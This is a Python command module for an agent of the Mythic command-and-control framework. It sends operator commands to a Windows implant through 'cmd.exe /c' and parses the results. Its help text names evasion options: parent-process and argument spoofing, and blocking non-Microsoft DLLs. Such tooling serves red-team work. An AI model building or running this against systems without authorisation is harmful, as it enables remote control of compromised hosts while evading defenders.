from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .Utils.u import *

class ProcCmdArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="Command to execute via cmd.exe",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise ValueError("Must supply command to execute")

        # Handle JSON input
        if self.command_line.strip().startswith("{"):
            self.load_args_from_json_string(self.command_line)
            return

        # Initialize variables
        command_value = ""
        using_command_param = False

        # Split while preserving quoted strings
        parts = []
        current_part = []
        in_quote = False
        quote_char = None
        
        for char in self.command_line:
            if char in ('"', "'") and not in_quote:
                in_quote = True
                quote_char = char
            elif char == quote_char and in_quote:
                in_quote = False
                quote_char = None
            elif char == ' ' and not in_quote:
                if current_part:
                    parts.append(''.join(current_part))
                    current_part = []
            else:
                current_part.append(char)
        
        if current_part:
            parts.append(''.join(current_part))

        # Parse the parts
        i = 0
        while i < len(parts):
            part = parts[i]
            if part == "-command":
                if i + 1 < len(parts):
                    command_value = parts[i+1]
                    # Remove surrounding quotes if present
                    if (command_value.startswith('"') and command_value.endswith('"')) or \
                       (command_value.startswith("'") and command_value.endswith("'")):
                        command_value = command_value[1:-1]
                    using_command_param = True
                    i += 2
                else:
                    raise ValueError("No value provided after -command")
            else:
                if not using_command_param:
                    # Treat as direct command
                    command_value = ' '.join(parts[i:])
                    break
                i += 1

class ProcCmdCommand(CommandBase):
    cmd = "proc-cmd"
    needs_admin = False
    help_cmd = 'proc-cmd -command [command]'
    description = \
    """
    Run a command via cmd.exe

    Examples:
        proc-cmd -command dir

    Obs:
        This command behavior can be modified using:
            - "config -arg"  : to spoof the process createtion argument
            - "config -ppid" : to change parent process to spawn
            - "config -blockdlls" : to block non-microsoft dll for load in the process
            - "config -curdir" : to change current direct in the process information (dont change the execution path context) 
    """
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1059", "T1059.003"]
    argument_class = ProcCmdArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        command = task.args.get_arg("command")
        task.args.add_arg("command", f"cmd.exe /c {command}")
        task.args.add_arg("action", "cmd")
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            Success=True,
            DisplayParams=f"-command {command}",
            CommandName="proc"
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:

        RawResponse = bytes.fromhex(response)
        Psr = Parser(RawResponse, len(RawResponse))

        sub_id = int.from_bytes(Psr.Pad(1), byteorder="big")

        ProcID = Psr.Int32();
        TdID   = Psr.Int32();
        Output = Psr.Bytes();
        
        FinalOutput = f"[+] cmd.exe Created with ID: {ProcID} and Main Thread ID: {TdID}\n[+] Received {len(Output)} bytes from agent\n[+] Output:\n\n{Output.decode('cp850')}"
    
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID=task.Task.ID,
            Response=FinalOutput
        ))

        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )